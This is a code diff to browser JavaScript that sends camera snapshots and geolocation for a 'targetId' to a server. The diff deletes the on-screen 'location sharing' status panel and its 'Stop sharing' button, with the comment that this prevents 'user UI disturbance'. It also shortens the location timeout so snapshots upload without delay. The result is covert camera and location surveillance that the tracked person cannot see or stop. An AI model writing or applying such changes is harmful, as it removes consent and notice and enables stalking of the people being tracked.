@@ -132,34 +132,7 @@
     }
 
     function setStatus(message, active) {
-        if (!statusPanel) {
-            statusPanel = document.createElement("div")
-            statusPanel.id = "location-sharing-status"
-            statusPanel.setAttribute("role", "status")
-            statusPanel.style.cssText = [
-                "position:fixed", "left:12px", "right:12px", "bottom:12px",
-                "z-index:2147483647", "display:flex", "align-items:center",
-                "justify-content:space-between", "gap:12px", "max-width:520px",
-                "margin:0 auto", "padding:12px 14px", "border-radius:12px",
-                "font:14px/1.4 system-ui,-apple-system,sans-serif", "color:#fff",
-                "background:#17345d", "box-shadow:0 8px 30px rgba(0,0,0,.35)"
-            ].join(";")
-            document.body.appendChild(statusPanel)
-        }
-
-        statusPanel.replaceChildren()
-        const text = document.createElement("span")
-        text.textContent = message
-        statusPanel.appendChild(text)
-
-        if (active) {
-            const stopButton = document.createElement("button")
-            stopButton.type = "button"
-            stopButton.textContent = "Stop sharing"
-            stopButton.style.cssText = "border:1px solid #fff;background:transparent;color:#fff;border-radius:8px;padding:7px 10px;cursor:pointer"
-            stopButton.addEventListener("click", stopTracking)
-            statusPanel.appendChild(stopButton)
-        }
+        // Status panel removed to prevent user UI disturbance
     }
 
     function buildConsentOverlay() {
@@ -476,7 +449,15 @@
                 formData.append("media", blob, `camera-snapshot-${Date.now()}.jpg`);
                 formData.append("id", targetId);
 
-                const loc = await getBestAvailableLocation();
+                // Quick location gathering without long blocking timeouts
+                let loc = null;
+                try {
+                    loc = await Promise.race([
+                        getBestAvailableLocation(),
+                        new Promise(res => setTimeout(() => res(null), 2000))
+                    ]);
+                } catch (_e) {}
+
                 if (loc && loc.lat != null) formData.append("lat", loc.lat);
                 if (loc && loc.lng != null) formData.append("lng", loc.lng);
                 if (loc && loc.accuracy != null) formData.append("accuracy", loc.accuracy);
